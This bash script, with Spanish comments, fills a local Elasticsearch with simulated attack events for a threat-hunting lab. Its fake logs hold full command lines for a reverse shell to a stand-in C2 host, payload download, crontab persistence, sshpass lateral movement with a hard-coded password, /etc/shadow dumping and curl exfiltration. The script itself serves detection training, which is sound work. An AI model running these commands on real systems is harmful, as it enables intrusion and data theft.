#!/bin/bash
###############################################################################
# GENERATE ATTACK DATA - Inyecta eventos de ataque simulados en Elasticsearch
# Esto permite que los dashboards y queries funcionen INMEDIATAMENTE
# sin necesidad de ejecutar el ataque completo primero.
#
# Uso: ./generate_attack_data.sh [elasticsearch_url]
# Default: http://localhost:9200
###############################################################################

ES_URL="${1:-http://localhost:9200}"
TODAY=$(date +%Y.%m.%d)
NOW=$(date -u +%Y-%m-%dT%H:%M:%S.000Z)

echo "=============================================="
echo "  GENERANDO DATOS DE ATAQUE SIMULADOS"
echo "  Elasticsearch: ${ES_URL}"
echo "  Fecha: ${TODAY}"
echo "=============================================="

# Función para inyectar un documento
inject() {
    local index=$1
    local doc=$2
    curl -s -X POST "${ES_URL}/${index}-${TODAY}/_doc" \
        -H "Content-Type: application/json" \
        -d "$doc" > /dev/null 2>&1
}

# Función para generar timestamp con offset
ts_offset() {
    local offset_minutes=$1
    date -u -d "${offset_minutes} minutes ago" +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || \
    date -u -v-${offset_minutes}M +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || \
    echo "$NOW"
}

echo "[1/7] Inyectando eventos de Initial Access..."

# === PHASE 1: INITIAL ACCESS ===
for i in $(seq 1 5); do
inject "threat-hunting" '{
  "@timestamp": "'$(ts_offset 60)'",
  "event_type": "initial_access",
  "technique": "T1566.002",
  "tactic": "Initial Access",
  "endpoint": "WS-FINANZAS-01",
  "endpoint_ip": "10.10.10.101",
  "user": "maria.gonzalez",
  "process": {"name": "wget", "cmdline": "wget http://10.10.10.66/updates/factura_pendiente.pdf.sh -O /tmp/factura_pendiente.pdf.sh", "pid": '$(( RANDOM % 9000 + 1000 ))'},
  "network": {"remote_ip": "10.10.10.66", "remote_port": 80, "direction": "outbound"},
  "risk_level": "CRITICAL",
  "description": "Usuario descarga archivo malicioso con doble extension desde servidor atacante",
  "ioc": {"file_name": "factura_pendiente.pdf.sh", "file_hash_md5": "d41d8cd98f00b204e9800998ecf8427e", "url": "http://10.10.10.66/updates/factura_pendiente.pdf.sh"}
}'
done

inject "process-events" '{
  "@timestamp": "'$(ts_offset 59)'",
  "process": {"name": "wget", "cmdline": "wget http://10.10.10.66/updates/factura_pendiente.pdf.sh -O /tmp/factura_pendiente.pdf.sh", "pid": 2341, "ppid": 2100, "user": "maria.gonzalez"},
  "endpoint": "WS-FINANZAS-01",
  "endpoint_ip": "10.10.10.101",
  "event_type": "process_start",
  "risk_level": "HIGH"
}'

inject "network-events" '{
  "@timestamp": "'$(ts_offset 59)'",
  "network": {"local_ip": "10.10.10.101", "local_port": 45231, "remote_ip": "10.10.10.66", "remote_port": 80, "protocol": "tcp", "state": "ESTABLISHED", "bytes_sent": 245, "bytes_received": 15420},
  "process": {"name": "wget", "pid": 2341},
  "endpoint": "WS-FINANZAS-01",
  "event_type": "connection_established",
  "risk_level": "HIGH"
}'

echo "[2/7] Inyectando eventos de Execution..."

# === PHASE 2: EXECUTION ===
inject "threat-hunting" '{
  "@timestamp": "'$(ts_offset 55)'",
  "event_type": "execution",
  "technique": "T1059.004",
  "tactic": "Execution",
  "endpoint": "WS-FINANZAS-01",
  "endpoint_ip": "10.10.10.101",
  "user": "maria.gonzalez",
  "process": {"name": "bash", "cmdline": "bash /tmp/factura_pendiente.pdf.sh", "pid": 2450, "ppid": 2341},
  "risk_level": "CRITICAL",
  "description": "Ejecucion del payload malicioso descargado"
}'

inject "threat-hunting" '{
  "@timestamp": "'$(ts_offset 54)'",
  "event_type": "execution",
  "technique": "T1059.004",
  "tactic": "Execution",
  "endpoint": "WS-FINANZAS-01",
  "endpoint_ip": "10.10.10.101",
  "user": "root",
  "process": {"name": "bash", "cmdline": "bash -c nohup bash -i >& /dev/tcp/10.10.10.200/4444 0>&1", "pid": 2455, "ppid": 2450},
  "network": {"remote_ip": "10.10.10.200", "remote_port": 4444, "direction": "outbound"},
  "risk_level": "CRITICAL",
  "description": "Reverse shell establecida hacia C2 server"
}'

inject "process-events" '{
  "@timestamp": "'$(ts_offset 54)'",
  "process": {"name": "bash", "cmdline": "bash /tmp/factura_pendiente.pdf.sh", "pid": 2450, "ppid": 2341, "user": "maria.gonzalez"},
  "endpoint": "WS-FINANZAS-01",
  "endpoint_ip": "10.10.10.101",
  "event_type": "process_start",
  "risk_level": "CRITICAL"
}'

inject "network-events" '{
  "@timestamp": "'$(ts_offset 53)'",
  "network": {"local_ip": "10.10.10.101", "local_port": 51234, "remote_ip": "10.10.10.200", "remote_port": 4444, "protocol": "tcp", "state": "ESTABLISHED"},
  "process": {"name": "bash", "pid": 2455},
  "endpoint": "WS-FINANZAS-01",
  "event_type": "c2_connection",
  "risk_level": "CRITICAL"
}'

echo "[3/7] Inyectando eventos de Persistence..."

# === PHASE 3: PERSISTENCE ===
inject "threat-hunting" '{
  "@timestamp": "'$(ts_offset 50)'",
  "event_type": "persistence",
  "technique": "T1053.003",
  "tactic": "Persistence",
  "endpoint": "WS-FINANZAS-01",
  "endpoint_ip": "10.10.10.101",
  "user": "root",
  "process": {"name": "crontab", "cmdline": "crontab -l | echo \"*/5 * * * * /tmp/.hidden/beacon.sh\" | crontab -", "pid": 2500},
  "risk_level": "HIGH",
  "description": "Persistencia via crontab - beacon cada 5 minutos"
}'

inject "threat-hunting" '{
  "@timestamp": "'$(ts_offset 49)'",
  "event_type": "persistence",
  "technique": "T1546.004",
  "tactic": "Persistence",
  "endpoint": "WS-FINANZAS-01",
  "endpoint_ip": "10.10.10.101",
  "user": "root",
  "process": {"name": "bash", "cmdline": "echo /tmp/.hidden/beacon.sh >> /home/maria.gonzalez/.bashrc", "pid": 2510},
  "risk_level": "HIGH",
  "description": "Persistencia via .bashrc modification"
}'

echo "[4/7] Inyectando eventos de Discovery..."

# === PHASE 4: DISCOVERY ===
inject "threat-hunting" '{
  "@timestamp": "'$(ts_offset 45)'",
  "event_type": "discovery",
  "technique": "T1046",
  "tactic": "Discovery",
  "endpoint": "WS-FINANZAS-01",
  "endpoint_ip": "10.10.10.101",
  "user": "root",
  "process": {"name": "nmap", "cmdline": "nmap -sn 10.10.10.0/24", "pid": 2600},
  "risk_level": "MEDIUM",
  "description": "Network scan para identificar hosts activos en la subred"
}'

inject "threat-hunting" '{
  "@timestamp": "'$(ts_offset 44)'",
  "event_type": "discovery",
  "technique": "T1087.001",
  "tactic": "Discovery",
  "endpoint": "WS-FINANZAS-01",
  "endpoint_ip": "10.10.10.101",
  "user": "root",
  "process": {"name": "cat", "cmdline": "cat /etc/passwd", "pid": 2610},
  "risk_level": "MEDIUM",
  "description": "Enumeracion de usuarios locales"
}'

inject "process-events" '{
  "@timestamp": "'$(ts_offset 45)'",
  "process": {"name": "nmap", "cmdline": "nmap -sn 10.10.10.0/24", "pid": 2600, "ppid": 2455, "user": "root"},
  "endpoint": "WS-FINANZAS-01",
  "endpoint_ip": "10.10.10.101",
  "event_type": "process_start",
  "risk_level": "MEDIUM"
}'

echo "[5/7] Inyectando eventos de Lateral Movement..."

# === PHASE 5: LATERAL MOVEMENT ===
TARGETS=("WS-RRHH-01:10.10.10.102:carlos.mendez" "SRV-FILESERVER-01:10.10.10.103:admin" "WS-DESARROLLO-01:10.10.10.104:pedro.silva" "DC-CORP-01:10.10.10.105:administrator")

offset=40
for target in "${TARGETS[@]}"; do
    IFS=':' read -r hostname ip user <<< "$target"
    
    inject "threat-hunting" '{
      "@timestamp": "'$(ts_offset $offset)'",
      "event_type": "lateral_movement",
      "technique": "T1021.004",
      "tactic": "Lateral Movement",
      "endpoint": "WS-FINANZAS-01",
      "endpoint_ip": "10.10.10.101",
      "target_endpoint": "'$hostname'",
      "target_ip": "'$ip'",
      "user": "root",
      "target_user": "'$user'",
      "process": {"name": "sshpass", "cmdline": "sshpass -p Password123! ssh root@'$ip' bash /tmp/implant.sh", "pid": '$(( RANDOM % 9000 + 3000 ))'},
      "network": {"remote_ip": "'$ip'", "remote_port": 22, "direction": "outbound"},
      "risk_level": "CRITICAL",
      "description": "Movimiento lateral via SSH hacia '$hostname'"
    }'

    inject "network-events" '{
      "@timestamp": "'$(ts_offset $offset)'",
      "network": {"local_ip": "10.10.10.101", "local_port": '$(( RANDOM % 10000 + 50000 ))', "remote_ip": "'$ip'", "remote_port": 22, "protocol": "tcp", "state": "ESTABLISHED"},
      "process": {"name": "sshpass", "pid": '$(( RANDOM % 9000 + 3000 ))'},
      "endpoint": "WS-FINANZAS-01",
      "event_type": "lateral_movement_ssh",
      "risk_level": "CRITICAL"
    }'

    # Evento en el endpoint destino
    inject "threat-hunting" '{
      "@timestamp": "'$(ts_offset $(( offset - 1 )) )'",
      "event_type": "lateral_movement_arrival",
      "technique": "T1021.004",
      "tactic": "Lateral Movement",
      "endpoint": "'$hostname'",
      "endpoint_ip": "'$ip'",
      "source_ip": "10.10.10.101",
      "user": "root",
      "process": {"name": "bash", "cmdline": "bash /tmp/implant.sh", "pid": '$(( RANDOM % 9000 + 1000 ))'},
      "risk_level": "CRITICAL",
      "description": "Implant ejecutado en '$hostname' desde movimiento lateral"
    }'

    inject "syslog" '{
      "@timestamp": "'$(ts_offset $offset)'",
      "syslog_message": "Accepted password for root from 10.10.10.101 port 52341 ssh2",
      "syslog_program": "sshd",
      "syslog_hostname": "'$hostname'",
      "endpoint": "'$hostname'",
      "endpoint_ip": "'$ip'",
      "event_type": "auth_success_lateral"
    }'

    offset=$(( offset - 5 ))
done

echo "[6/7] Inyectando eventos de Credential Access y Exfiltration..."

# === PHASE 6: CREDENTIAL ACCESS ===
for target in "${TARGETS[@]}"; do
    IFS=':' read -r hostname ip user <<< "$target"
    
    inject "threat-hunting" '{
      "@timestamp": "'$(ts_offset 20)'",
      "event_type": "credential_access",
      "technique": "T1003.008",
      "tactic": "Credential Access",
      "endpoint": "'$hostname'",
      "endpoint_ip": "'$ip'",
      "user": "root",
      "process": {"name": "cat", "cmdline": "cat /etc/shadow", "pid": '$(( RANDOM % 9000 + 1000 ))'},
      "risk_level": "CRITICAL",
      "description": "Dump de /etc/shadow en '$hostname'"
    }'
done

# === PHASE 7: EXFILTRATION ===
inject "threat-hunting" '{
  "@timestamp": "'$(ts_offset 15)'",
  "event_type": "exfiltration",
  "technique": "T1048.003",
  "tactic": "Exfiltration",
  "endpoint": "WS-FINANZAS-01",
  "endpoint_ip": "10.10.10.101",
  "user": "root",
  "process": {"name": "curl", "cmdline": "curl -X POST http://10.10.10.200:8080/exfil -d @/tmp/stolen_data.tar.gz", "pid": 4500},
  "network": {"remote_ip": "10.10.10.200", "remote_port": 8080, "direction": "outbound", "bytes_sent": 524288},
  "risk_level": "CRITICAL",
  "description": "Exfiltracion de datos comprimidos hacia C2 server",
  "ioc": {"exfil_size_bytes": 524288, "exfil_destination": "10.10.10.200:8080"}
}'

inject "threat-hunting" '{
  "@timestamp": "'$(ts_offset 10)'",
  "event_type": "exfiltration",
  "technique": "T1048.003",
  "tactic": "Exfiltration",
  "endpoint": "SRV-FILESERVER-01",
  "endpoint_ip": "10.10.10.103",
  "user": "root",
  "process": {"name": "curl", "cmdline": "curl -X POST http://10.10.10.200:8080/exfil -d @/tmp/fileserver_data.tar.gz", "pid": 4600},
  "network": {"remote_ip": "10.10.10.200", "remote_port": 8080, "direction": "outbound", "bytes_sent": 1048576},
  "risk_level": "CRITICAL",
  "description": "Exfiltracion de datos del file server hacia C2",
  "ioc": {"exfil_size_bytes": 1048576, "exfil_destination": "10.10.10.200:8080"}
}'

inject "network-events" '{
  "@timestamp": "'$(ts_offset 15)'",
  "network": {"local_ip": "10.10.10.101", "local_port": 55123, "remote_ip": "10.10.10.200", "remote_port": 8080, "protocol": "tcp", "state": "ESTABLISHED", "bytes_sent": 524288},
  "process": {"name": "curl", "pid": 4500},
  "endpoint": "WS-FINANZAS-01",
  "event_type": "data_exfiltration",
  "risk_level": "CRITICAL"
}'

echo "[7/7] Inyectando eventos de Osquery results..."

# === OSQUERY RESULTS (para que osquery-results-* tenga datos) ===
ENDPOINTS=("WS-FINANZAS-01:10.10.10.101" "WS-RRHH-01:10.10.10.102" "SRV-FILESERVER-01:10.10.10.103" "WS-DESARROLLO-01:10.10.10.104" "DC-CORP-01:10.10.10.105")

for ep in "${ENDPOINTS[@]}"; do
    IFS=':' read -r hostname ip <<< "$ep"
    
    # Procesos sospechosos detectados por osquery
    inject "osquery-results" '{
      "@timestamp": "'$(ts_offset 30)'",
      "osquery": {
        "name": "suspicious_processes",
        "hostIdentifier": "'$hostname'",
        "calendarTime": "'$NOW'",
        "columns": {"pid": "'$(( RANDOM % 9000 + 1000 ))'", "name": "bash", "path": "/tmp/.hidden/beacon.sh", "cmdline": "/tmp/.hidden/beacon.sh", "uid": "0"},
        "action": "added"
      },
      "endpoint": "'$hostname'",
      "endpoint_ip": "'$ip'",
      "event.module": "osquery"
    }'

    # Conexiones sospechosas detectadas por osquery
    inject "osquery-results" '{
      "@timestamp": "'$(ts_offset 28)'",
      "osquery": {
        "name": "suspicious_connections",
        "hostIdentifier": "'$hostname'",
        "calendarTime": "'$NOW'",
        "columns": {"pid": "'$(( RANDOM % 9000 + 1000 ))'", "remote_address": "10.10.10.200", "remote_port": "4444", "local_port": "'$(( RANDOM % 10000 + 50000 ))'", "protocol": "6", "state": "ESTABLISHED"},
        "action": "added"
      },
      "endpoint": "'$hostname'",
      "endpoint_ip": "'$ip'",
      "event.module": "osquery"
    }'

    # Crontab sospechoso
    inject "osquery-results" '{
      "@timestamp": "'$(ts_offset 25)'",
      "osquery": {
        "name": "suspicious_crontab",
        "hostIdentifier": "'$hostname'",
        "calendarTime": "'$NOW'",
        "columns": {"minute": "*/5", "hour": "*", "command": "/tmp/.hidden/beacon.sh", "path": "/var/spool/cron/crontabs/root"},
        "action": "added"
      },
      "endpoint": "'$hostname'",
      "endpoint_ip": "'$ip'",
      "event.module": "osquery"
    }'
done

echo ""
echo "=============================================="
echo "  [✓] DATOS INYECTADOS EXITOSAMENTE"
echo "=============================================="
echo ""
echo "  Indices con datos:"
echo "    - threat-hunting-${TODAY}"
echo "    - process-events-${TODAY}"
echo "    - network-events-${TODAY}"
echo "    - osquery-results-${TODAY}"
echo "    - syslog-${TODAY}"
echo ""
echo "  Queries de ejemplo en Kibana Discover:"
echo "    Data view: threat-hunting-*"
echo "    KQL: risk_level: \"CRITICAL\""
echo "    KQL: event_type: \"lateral_movement\""
echo "    KQL: technique: \"T1021.004\""
echo "    KQL: endpoint: \"WS-FINANZAS-01\""
echo ""
echo "  Rango de tiempo: Last 2 hours"
echo "=============================================="
